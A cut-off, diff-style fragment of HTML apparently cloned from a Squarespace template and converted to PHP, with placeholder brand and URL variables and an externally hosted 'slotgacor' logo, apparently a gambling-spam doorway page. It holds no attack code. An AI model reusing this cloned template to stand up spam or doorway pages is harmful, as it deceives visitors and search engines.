?>","sslSetting":3,"isHstsEnabled":true,"socialAccounts":[{"serviceId":64,"addedOn":1722424928318,"profileUrl":"http://instagram.com/squarespace","iconEnabled":true,"serviceName":"instagram-unauth"}],"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"captchaSettings":{"enabledForDonations":false},"showOwnerLogin":false},"websiteSettings":{"id":"66aa1e6064c6eb109e981f3c","websiteId":"66aa1e6064c6eb109e981f39","subjects":[],"country":"KH","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"announcementBarSettings":{},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"businessHours":{},"storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"currenciesSupported":["USD","CAD","GBP","AUD","EUR","CHF","NOK","SEK","DKK","NZD","SGD","MXN","HKD","CZK","ILS","MYR","RUB","PHP","PLN","THB","BRL","ARS","COP","IDR","INR","JPY","ZAR"],"defaultCurrency":"USD","selectedCurrency":"USD","measurementStandard":1,"showCustomCheckoutForm":false,"checkoutPageMarketingOptInEnabled":true,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"merchandisingSettings":{"scarcityEnabledOnProductItems":false,"scarcityEnabledOnProductBlocks":false,"scarcityMessageType":"DEFAULT_SCARCITY_MESSAGE","scarcityThreshold":10,"multipleQuantityAllowedForServices":true,"restockNotificationsEnabled":false,"restockNotificationsMailingListSignUpEnabled":false,"relatedProductsEnabled":false,"relatedProductsOrdering":"random","soldOutVariantsDropdownDisabled":false,"productComposerOptedIn":false,"productComposerABTestOptedOut":false,"productReviewsEnabled":false},"minimumOrderSubtotalEnabled":false,"minimumOrderSubtotal":{"currency":"USD","value":"0.00"},"isLive":false,"multipleQuantityAllowedForServices":true},"useEscapeKeyToLogin":false,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"ampEnabled":false,"userAccountsSettings":{"loginAllowed":true,"signupAllowed":true}},"cookieSettings":{"isCookieBannerEnabled":false,"isRestrictiveCookiePolicyEnabled":false,"isRestrictiveCookiePolicyAbsolute":false,"cookieBannerText":"","cookieBannerTheme":"","cookieBannerVariant":"","cookieBannerPosition":"","cookieBannerCtaVariant":"","cookieBannerCtaText":"","cookieBannerAcceptType":"OPT_IN","cookieBannerOptOutCtaText":"","cookieBannerHasOptOut":false,"cookieBannerHasManageCookies":true,"cookieBannerManageCookiesLabel":"","cookieBannerSavedPreferencesText":"","cookieBannerSavedPreferencesLayout":"PILL"},"websiteCloneable":false,"collection":{"title":"Home","id":"66aa1e7e3f10ff32dbb82b76","fullUrl":"/","type":10,"permissionType":1},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"form-use-theme-colors":"false","header-logo-height":"50px","header-mobile-logo-max-height":"30px","header-vert-padding":"2.9vw","header-width":"Full","maxPageWidth":"2606px","pagePadding":"2vw","tweak-blog-alternating-side-by-side-image-aspect-ratio":"1:1 Square","tweak-blog-alternating-side-by-side-image-spacing":"6%","tweak-blog-alternating-side-by-side-meta-spacing":"20px","tweak-blog-alternating-side-by-side-primary-meta":"Categories","tweak-blog-alternating-side-by-side-read-more-spacing":"20px","tweak-blog-alternating-side-by-side-secondary-meta":"Date","tweak-blog-basic-grid-columns":"3","tweak-blog-basic-grid-image-aspect-ratio":"1:1 Square","tweak-blog-basic-grid-image-spacing":"30px","tweak-blog-basic-grid-meta-spacing":"17px","tweak-blog-basic-grid-primary-meta":"Categories","tweak-blog-basic-grid-read-more-spacing":"37px","tweak-blog-basic-grid-secondary-meta":"Date","tweak-blog-item-custom-width":"75","tweak-blog-item-show-author-profile":"false","tweak-blog-item-width":"Narrow","tweak-blog-masonry-columns":"2","tweak-blog-masonry-horizontal-spacing":"64px","tweak-blog-masonry-image-spacing":"20px","tweak-blog-masonry-meta-spacing":"10px","tweak-blog-masonry-primary-meta":"Categories","tweak-blog-masonry-read-more-spacing":"22px","tweak-blog-masonry-secondary-meta":"Date","tweak-blog-masonry-vertical-spacing":"231px","tweak-blog-side-by-side-image-aspect-ratio":"1:1 Square","tweak-blog-side-by-side-image-spacing":"6%","tweak-blog-side-by-side-meta-spacing":"20px","tweak-blog-side-by-side-primary-meta":"Categories","tweak-blog-side-by-side-read-more-spacing":"20px","tweak-blog-side-by-side-secondary-meta":"Date","tweak-blog-single-column-image-spacing":"50px","tweak-blog-single-column-meta-spacing":"30px","tweak-blog-single-column-primary-meta":"Categories","tweak-blog-single-column-read-more-spacing":"30px","tweak-blog-single-column-secondary-meta":"Date","tweak-events-stacked-show-thumbnails":"true","tweak-events-stacked-thumbnail-size":"3:2 Standard","tweak-fixed-header":"false","tweak-fixed-header-style":"Basic","tweak-global-animations-animation-curve":"ease","tweak-global-animations-animation-delay":"0.6s","tweak-global-animations-animation-duration":"1.50s","tweak-global-animations-animation-style":"fade","tweak-global-animations-animation-type":"fade","tweak-global-animations-complexity-level":"detailed","tweak-global-animations-enabled":"true","tweak-portfolio-grid-basic-custom-height":"50","tweak-portfolio-grid-overlay-custom-height":"50","tweak-portfolio-hover-follow-acceleration":"10%","tweak-portfolio-hover-follow-animation-duration":"Fast","tweak-portfolio-hover-follow-animation-type":"Fade","tweak-portfolio-hover-follow-delimiter":"Bullet","tweak-portfolio-hover-follow-front":"false","tweak-portfolio-hover-follow-layout":"Inline","tweak-portfolio-hover-follow-size":"50","tweak-portfolio-hover-follow-text-spacing-x":"1.5","tweak-portfolio-hover-follow-text-spacing-y":"1.5","tweak-portfolio-hover-static-animation-duration":"Fast","tweak-portfolio-hover-static-animation-type":"Fade","tweak-portfolio-hover-static-delimiter":"Hyphen","tweak-portfolio-hover-static-front":"true","tweak-portfolio-hover-static-layout":"Inline","tweak-portfolio-hover-static-size":"50","tweak-portfolio-hover-static-text-spacing-x":"1.5","tweak-portfolio-hover-static-text-spacing-y":"1.5","tweak-portfolio-index-background-animation-duration":"Medium","tweak-portfolio-index-background-animation-type":"Fade","tweak-portfolio-index-background-custom-height":"50","tweak-portfolio-index-background-delimiter":"None","tweak-portfolio-index-background-height":"Large","tweak-portfolio-index-background-horizontal-alignment":"Center","tweak-portfolio-index-background-link-format":"Stacked","tweak-portfolio-index-background-persist":"false","tweak-portfolio-index-background-vertical-alignment":"Middle","tweak-portfolio-index-background-width":"Full","tweak-product-basic-item-click-action":"None","tweak-product-basic-item-gallery-aspect-ratio":"1:1 Square","tweak-product-basic-item-gallery-design":"Slideshow","tweak-product-basic-item-gallery-width":"53%","tweak-product-basic-item-hover-action":"Zoom","tweak-product-basic-item-image-spacing":"10vw","tweak-product-basic-item-image-zoom-factor":"1.5","tweak-product-basic-item-product-variant-display":"Dropdown","tweak-product-basic-item-thumbnail-placement":"Side","tweak-product-basic-item-variant-picker-layout":"Dropdowns","tweak-products-add-to-cart-button":"false","tweak-products-columns":"2","tweak-products-gutter-column":"2vw","tweak-products-gutter-row":"4vw","tweak-products-header-text-alignment":"Middle","tweak-products-image-aspect-ratio":"1:1 Square","tweak-products-image-text-spacing":"2vw","tweak-products-mobile-columns":"2","tweak-products-text-alignment":"Middle","tweak-products-width":"Inset","tweak-transparent-header":"true"},"templateId":"5c5a519771c10ba3470d8101","templateVersion":"7.1","pageFeatures":[1,2,4],"gmRenderKey":"QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4","templateScriptsRootUrl":"https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/","impersonatedSession":false,"demoCollections":[{"collectionId":"624b505cf2456b3affdeb087","deleted":false},{"collectionId":"624b505af2456b3affdeb048","deleted":false},{"collectionId":"624b503cf2456b3affdeab4e","deleted":false},{"collectionId":"624b5056f2456b3affdeafc1","deleted":false},{"collectionId":"624b505df2456b3affdeb095","deleted":false},{"collectionId":"624b5062f2456b3affdeb134","deleted":true},{"collectionId":"624b5060f2456b3affdeb0db","deleted":false}],"tzData":{"zones":[[420,null,"+07",null]],"rules":{}},"showAnnouncementBar":false,"recaptchaEnterpriseContext":{"recaptchaEnterpriseSiteKey":"6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"},"i18nContext":{"timeZoneData":{"id":"Asia/Bangkok","name":"Indochina Time"}},"env":"PRODUCTION"};</script><script type="application/ld+json">{"url":"<?php echo $urlPath ?>","name":"<?php echo $BRANDS ?>","description":"","image":"https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg","@context":"http://schema.org","@type":"WebSite"}</script><script type="application/ld+json">{"address":"","image":"https://static1.squarespace.com/static/66aa1e6064c6eb109e981f39/t/66aa20076e767717d131ca5a/1722424958227/","openingHours":"","@context":"http://schema.org","@type":"LocalBusiness"}</script><link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/versioned-site-css/66aa1e6064c6eb109e981f39/1/5c5a519771c10ba3470d8101/66aa1e6064c6eb109e981f43/1547/site.css"/><script>Static.COOKIE_BANNER_CAPABLE = true;</script>
-<!-- End of Squarespace Headers -->
-    
-      <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/versioned-assets/1721408144877-4GZSJSP9JW8EDYZ7G86P/static.css">
-    
-  </head>
-
-  <body
-    id="collection-66aa1e7e3f10ff32dbb82b76"
-    class="
-      primary-button-style-outline primary-button-shape-pill secondary-button-style-outline secondary-button-shape-pill tertiary-button-style-outline tertiary-button-shape-pill  form-field-style-solid form-field-shape-square form-field-border-all form-field-checkbox-type-icon form-field-checkbox-fill-solid form-field-checkbox-color-inverted form-field-checkbox-shape-square form-field-checkbox-layout-stack form-field-radio-type-icon form-field-radio-fill-solid form-field-radio-color-normal form-field-radio-shape-pill form-field-radio-layout-stack form-field-survey-fill-solid form-field-survey-color-normal form-field-survey-shape-pill form-field-hover-focus-outline form-submit-button-style-label header-overlay-alignment-left header-width-full tweak-transparent-header  tweak-fixed-header-style-basic tweak-blog-alternating-side-by-side-width-full tweak-blog-alternating-side-by-side-image-aspect-ratio-11-square tweak-blog-alternating-side-by-side-text-alignment-left tweak-blog-alternating-side-by-side-read-more-style-hide tweak-blog-alternating-side-by-side-image-text-alignment-middle tweak-blog-alternating-side-by-side-delimiter-bullet tweak-blog-alternating-side-by-side-meta-position-top tweak-blog-alternating-side-by-side-primary-meta-categories tweak-blog-alternating-side-by-side-secondary-meta-date tweak-blog-alternating-side-by-side-excerpt-show tweak-blog-basic-grid-width-full tweak-blog-basic-grid-image-aspect-ratio-11-square tweak-blog-basic-grid-text-alignment-left tweak-blog-basic-grid-delimiter-bullet tweak-blog-basic-grid-image-placement-above tweak-blog-basic-grid-read-more-style-hide tweak-blog-basic-grid-primary-meta-categories tweak-blog-basic-grid-secondary-meta-date tweak-blog-basic-grid-excerpt-hide tweak-blog-item-width-narrow tweak-blog-item-text-alignment-left tweak-blog-item-meta-position-above-title  tweak-blog-item-show-date   tweak-blog-item-delimiter-bullet tweak-blog-masonry-width-inset tweak-blog-masonry-text-alignment-center tweak-blog-masonry-primary-meta-categories tweak-blog-masonry-secondary-meta-date tweak-blog-masonry-meta-position-top tweak-blog-masonry-read-more-style-hide tweak-blog-masonry-delimiter-space tweak-blog-masonry-image-placement-above tweak-blog-masonry-excerpt-show tweak-blog-side-by-side-width-inset tweak-blog-side-by-side-image-placement-left tweak-blog-side-by-side-image-aspect-ratio-11-square tweak-blog-side-by-side-primary-meta-categories tweak-blog-side-by-side-secondary-meta-date tweak-blog-side-by-side-meta-position-top tweak-blog-side-by-side-text-alignment-left tweak-blog-side-by-side-image-text-alignment-middle tweak-blog-side-by-side-read-more-style-show tweak-blog-side-by-side-delimiter-bullet tweak-blog-side-by-side-excerpt-show tweak-blog-single-column-width-inset tweak-blog-single-column-text-alignment-center tweak-blog-single-column-image-placement-above tweak-blog-single-column-delimiter-bullet tweak-blog-single-column-read-more-style-show tweak-blog-single-column-primary-meta-categories tweak-blog-single-column-secondary-meta-date tweak-blog-single-column-meta-position-top tweak-blog-single-column-content-full-post tweak-events-stacked-width-full tweak-events-stacked-height-large  tweak-events-stacked-show-thumbnails tweak-events-stacked-thumbnail-size-32-standard tweak-events-stacked-date-style-with-text tweak-events-stacked-show-time tweak-events-stacked-show-location  tweak-events-stacked-show-excerpt  tweak-global-animations-enabled tweak-global-animations-complexity-level-detailed tweak-global-animations-animation-style-fade tweak-global-animations-animation-type-fade tweak-global-animations-animation-curve-ease tweak-portfolio-grid-basic-width-full tweak-portfolio-grid-basic-height-small tweak-portfolio-grid-basic-image-aspect-ratio-11-square tweak-portfolio-grid-basic-text-alignment-left tweak-portfolio-grid-basic-hover-effect-fade tweak-portfolio-grid-overlay-width-full tweak-portfolio-grid-overlay-height-large tweak-portfolio-grid-overlay-image-aspect-ratio-11-square tweak-portfolio-grid-overlay-text-placement-center tweak-portfolio-grid-overlay-show-text-after-hover tweak-portfolio-index-background-link-format-stacked tweak-portfolio-index-background-width-full tweak-portfolio-index-background-height-large  tweak-portfolio-index-background-vertical-alignment-middle tweak-portfolio-index-background-horizontal-alignment-center tweak-portfolio-index-background-delimiter-none tweak-portfolio-index-background-animation-type-fade tweak-portfolio-index-background-animation-duration-medium tweak-portfolio-hover-follow-layout-inline  tweak-portfolio-hover-follow-delimiter-bullet tweak-portfolio-hover-follow-animation-type-fade tweak-portfolio-hover-follow-animation-duration-fast tweak-portfolio-hover-static-layout-inline tweak-portfolio-hover-static-front tweak-portfolio-hover-static-delimiter-hyphen tweak-portfolio-hover-static-animation-type-fade tweak-portfolio-hover-static-animation-duration-fast tweak-product-basic-item-product-variant-display-dropdown tweak-product-basic-item-product-subscription-display-radio tweak-product-basic-item-product-subscription-border-shape-square tweak-product-basic-item-width-full tweak-product-basic-item-gallery-aspect-ratio-11-square tweak-product-basic-item-text-alignment-left tweak-product-basic-item-navigation-none tweak-product-basic-item-description-position-below-price tweak-product-basic-item-description-position-mobile-below-add-to-cart-button tweak-product-basic-item-content-alignment-top tweak-product-basic-item-gallery-design-slideshow tweak-product-basic-item-gallery-placement-right tweak-product-basic-item-thumbnail-placement-side tweak-product-basic-item-click-action-none tweak-product-basic-item-hover-action-zoom tweak-product-basic-item-variant-picker-layout-dropdowns tweak-product-basic-item-add-to-cart-standalone tweak-product-basic-item-add-to-cart-mobile-standalone tweak-products-width-inset tweak-products-image-aspect-ratio-11-square tweak-products-text-alignment-middle  tweak-products-price-show tweak-products-nested-category-type-top  tweak-products-header-text-alignment-middle tweak-products-breadcrumbs image-block-poster-text-alignment-left image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-content-position-center image-block-collage-text-alignment-center image-block-stack-text-alignment-left hide-opentable-icons opentable-style-dark tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-center tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-usd collection-type-page collection-layout-default collection-66aa1e7e3f10ff32dbb82b76 homepage mobile-style-available sqs-seven-one
-      
-        show-tweak-description-position show-tweak-add-to-cart-button
-      
-      
-        
-          
-            
-              
-            
-          
-        
-      
-    "
-    tabindex="-1"
-  >
-    <div
-      id="siteWrapper"
-      class="clearfix site-wrapper"
-    >
-      
-      
-
-      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  <header
-    data-test="header"
-    id="header"
-    
-    class="
-      
-        
-          light
-        
-      
-      header theme-col--primary
-    "
-    data-section-theme="light"
-    data-controller="Header"
-    data-current-styles="{
-            &quot;layout&quot;: &quot;navCenter&quot;,
-            &quot;action&quot;: {
-              &quot;buttonText&quot;: &quot;Get Started&quot;,
-              &quot;newWindow&quot;: false
-            },
-            &quot;showSocial&quot;: false,
-            &quot;socialOptions&quot;: {
-              &quot;socialBorderShape&quot;: &quot;none&quot;,
-              &quot;socialBorderStyle&quot;: &quot;outline&quot;,
-              &quot;socialBorderThickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 1.0
-              }
-            },
-            &quot;sectionTheme&quot;: &quot;&quot;,
-            &quot;menuOverlayTheme&quot;: &quot;light&quot;,
-            &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
-            &quot;cartStyle&quot;: &quot;cart&quot;,
-            &quot;cartText&quot;: &quot;Cart&quot;,
-            &quot;showEmptyCartState&quot;: true,
-            &quot;cartOptions&quot;: {
-              &quot;iconType&quot;: &quot;solid-7&quot;,
-              &quot;cartBorderShape&quot;: &quot;none&quot;,
-              &quot;cartBorderStyle&quot;: &quot;outline&quot;,
-              &quot;cartBorderThickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 1.0
-              }
-            },
-            &quot;showButton&quot;: false,
-            &quot;showCart&quot;: true,
-            &quot;showAccountLogin&quot;: false,
-            &quot;headerStyle&quot;: &quot;dynamic&quot;,
-            &quot;languagePicker&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;iconEnabled&quot;: false,
-              &quot;iconType&quot;: &quot;globe&quot;,
-              &quot;flagShape&quot;: &quot;shiny&quot;,
-              &quot;languageFlags&quot;: [ ]
-            },
-            &quot;mobileOptions&quot;: {
-              &quot;layout&quot;: &quot;logoLeftNavRight&quot;,
-              &quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
-              &quot;menuIconOptions&quot;: {
-                &quot;style&quot;: &quot;doubleLineHamburger&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 1.0
-                }
-              }
-            },
-            &quot;dynamicOptions&quot;: {
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              }
-            },
-            &quot;solidOptions&quot;: {
-              &quot;headerOpacity&quot;: {
-                &quot;unit&quot;: &quot;%&quot;,
-                &quot;value&quot;: 100.0
-              },
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;dropShadow&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blur&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 30.0
-                },
-                &quot;spread&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;distance&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;blurBackground&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blurRadius&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 12.0
-                }
-              },
-              &quot;backgroundColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;white&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              },
-              &quot;navigationColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;gradientOptions&quot;: {
-              &quot;gradientType&quot;: &quot;faded&quot;,
-              &quot;headerOpacity&quot;: {
-                &quot;unit&quot;: &quot;%&quot;,
-                &quot;value&quot;: 90.0
-              },
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;dropShadow&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blur&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 30.0
-                },
-                &quot;spread&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;distance&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;blurBackground&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blurRadius&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 12.0
-                }
-              },
-              &quot;backgroundColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;white&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              },
-              &quot;navigationColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;dropShadowOptions&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;blur&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              },
-              &quot;spread&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 0.0
-              },
-              &quot;distance&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              }
-            },
-            &quot;borderOptions&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;position&quot;: &quot;allSides&quot;,
-              &quot;thickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 4.0
-              },
-              &quot;color&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;showPromotedElement&quot;: false,
-            &quot;buttonVariant&quot;: &quot;primary&quot;,
-            &quot;blurBackground&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;blurRadius&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              }
-            },
-            &quot;headerOpacity&quot;: {
-              &quot;unit&quot;: &quot;%&quot;,
-              &quot;value&quot;: 100.0
-            }
-          }"
-    data-section-id="header"
-    data-header-style="dynamic"
-    data-language-picker="{
-            &quot;enabled&quot;: false,
-            &quot;iconEnabled&quot;: false,
-            &quot;iconType&quot;: &quot;globe&quot;,
-            &quot;flagShape&quot;: &quot;shiny&quot;,
-            &quot;languageFlags&quot;: [ ]
-          }"
-    
-    data-first-focusable-element
-    tabindex="-1"
-    style="
-      
-        
-        
-          --headerBorderColor: hsla(var(--black-hsl), 1);
-        
-      
-      
-        --solidHeaderBackgroundColor: hsla(var(--white-hsl), 1);
-      
-      
-        --solidHeaderNavigationColor: hsla(var(--black-hsl), 1);
-      
-      
-        --gradientHeaderBackgroundColor: hsla(var(--white-hsl), 1);
-      
-      
-        --gradientHeaderNavigationColor: hsla(var(--black-hsl), 1);
-      
-    "
-  >
-    
-<div class="sqs-announcement-bar-dropzone"></div>
-
-    <div class="header-announcement-bar-wrapper">
-      
-      <a
-        href="#page"
-        class="header-skip-link sqs-button-element--primary"
-      >
-        Skip to Content
-      </a>
-      
-
-
-<style>
-    @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
-        .header-blur-background {
-            
-            
-        }
-    }
-</style>
-      <div
-        class="header-border"
-        data-header-style="dynamic"
-        data-header-usability-enabled="true"
-        data-header-border="false"
-        data-test="header-border"
-        style="
-
-
-
-
-
-
-  
-    border-width: 0px !important;
-  
-
-
-
-  
-
-
-
-"
-      ></div>
-      <div
-        class="header-dropshadow"
-        data-header-style="dynamic"
-        data-header-usability-enabled="true"
-        data-header-dropshadow="false"
-        data-test="header-dropshadow"
-        style="
-
-
-  
-"
-      ></div>
-      
-      
-
-      <div class='header-inner container--fluid
-        
-          header-layout--with-commerce
-        
-        
-        
-         header-mobile-layout-logo-left-nav-right
-        
-        
-        
-        
-        
-        
-        
-        
-         header-layout-nav-center
-        
-        
-        
-        
-        
-        
-        '
-        style="
-
-
-
-
-
-
-  
-    padding: 0;
-  
-
-
-
-"
-        data-test="header-inner"
-        >
-        <!-- Background -->
-        <div class="header-background theme-bg--primary"></div>
-
-        <div class="header-display-desktop" data-content-field="site-title">
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-          
-            
-
-
-<style>
-  .top-bun, 
-  .patty, 
-  .bottom-bun {
-    height: 1px;
-  }
-</style>
-
-<!-- Burger -->
-<div class="header-burger
-
-  menu-overlay-does-not-have-visible-non-navigation-items
-
-
-  
-  no-actions
-  
-" data-animation-role="header-element">
-  <button class="header-burger-btn burger" data-test="header-burger">
-    <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
-    <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
-    <div class="burger-box">
-      <div class="burger-inner header-menu-icon-doubleLineHamburger">
-        <div class="top-bun"></div>
-        <div class="patty"></div>
-        <div class="bottom-bun"></div>
-      </div>
-    </div>
-  </button>
-</div>
-
-            
-            <!-- Social -->
-            
-          
-            
-            <!-- Title and nav wrapper -->
-            <div class="header-title-nav-wrapper">
-              
-
-              
-
-              
-                
-                <!-- Title -->
-                
-                  <div
-                    class="
-                      header-title
-                      
-                    "
-                    data-animation-role="header-element"
-                  >
-                    
-                      <div class="header-title-logo">
-                        <a href="<?php echo $urlPath ?>" data-animation-role="header-element">
-                        
-<img elementtiming="nbf-header-logo-desktop" src="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/slotgacor.png?format=1500w" alt="<?php echo $BRANDS ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
-
-                        </a>
-                      </div>
-
-                    
-                    
-                  </div>
-                
-              
-                
-                <!-- Nav -->
-                <div class="header-nav">
-                  <div class="header-nav-wrapper">
-                    <nav class="header-nav-list">
-                      
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Shop
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Journal
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        About
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Contact
-      </a>
-    </div>
-  
-  
-  
-
-
-
-                    </nav>
-                  </div>
-                </div>
-              
-              
-            </div>
-          
-            
-            <!-- Actions -->
-            <div class="header-actions header-actions--right">
-              
-                
-              
-              
-
-              
-
-            
-            
-
-              
-
-              
-
-              
-
-              
-
-              
-            
-
-              
-              <div class="showOnMobile">
-                
-                  
-                
-                
-                  
-                    
-                <div class="header-actions-action header-actions-action--cart">
-                  <a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" >
-                    <span class="Cart-inner">
-                      
-
-
-
-  <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
